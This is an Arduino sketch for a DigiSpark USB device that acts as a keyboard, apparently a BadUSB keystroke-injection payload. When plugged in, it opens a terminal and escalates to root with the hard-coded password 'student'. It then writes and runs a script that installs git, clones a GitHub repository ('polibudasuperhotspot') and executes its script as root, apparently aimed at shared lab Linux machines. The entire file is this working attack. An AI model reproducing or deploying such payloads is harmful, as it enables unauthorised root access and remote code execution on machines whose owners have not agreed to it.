#include <Arduino.h>
#include <DigiKeyboard.h>

void setup()
{
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  delay(2000);

  DigiKeyboard.println(F("sudo -s"));
  delay(1000);

  DigiKeyboard.println(F("student"));
  delay(1000);

  DigiKeyboard.println(F("echo -e \"#!/bin/bash\" > bootstrap.sh"));
  DigiKeyboard.println(F("echo -e \"zypper in git --non-interactive || zypper in git-core --non-interactive || apt-get update && apt-get install git-all -y \" >> bootstrap.sh"));
  DigiKeyboard.println(F("echo -e \"git clone https://github.com/krygacz/polibudasuperhotspot.git\" >> bootstrap.sh"));
  DigiKeyboard.println(F("echo -e \"cd polibudasuperhotspot\" >> bootstrap.sh"));
  DigiKeyboard.println(F("echo -e \"chmod +x ./polibudasuperhotspot.sh\" >> bootstrap.sh"));
  DigiKeyboard.println(F("echo -e \"./polibudasuperhotspot.sh\" >> bootstrap.sh"));

  DigiKeyboard.println(F("chmod +x ./bootstrap.sh"));
  DigiKeyboard.println(F("./bootstrap.sh"));
}

void loop()
{
}